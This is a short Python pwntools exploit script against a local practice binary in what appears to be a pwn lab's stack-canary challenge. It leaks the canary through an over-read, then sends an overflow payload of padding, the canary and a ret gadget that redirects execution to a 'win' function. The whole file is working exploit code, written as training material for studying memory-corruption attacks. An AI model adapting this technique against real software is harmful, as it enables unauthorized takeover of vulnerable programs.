from pwn import*
chal='/mnt/d/code/c/pwn-lab/chals/04-canary/chal'
e=ELF(chal)
win=e.symbols['win']
gadget=0x40101a
p=process(chal)
p.send(b'A'*32)
leaked=p.recv(48)
canary=leaked[40:48]
payload=b'A'*40+canary+b'B'*8+p64(gadget)+p64(win)
print("泄漏长度 =", len(leaked))
print("泄漏内容 =", leaked.hex())
print("金丝雀   =", canary.hex())
print("payload长 =", len(payload))
p.send(payload)
p.interactive()
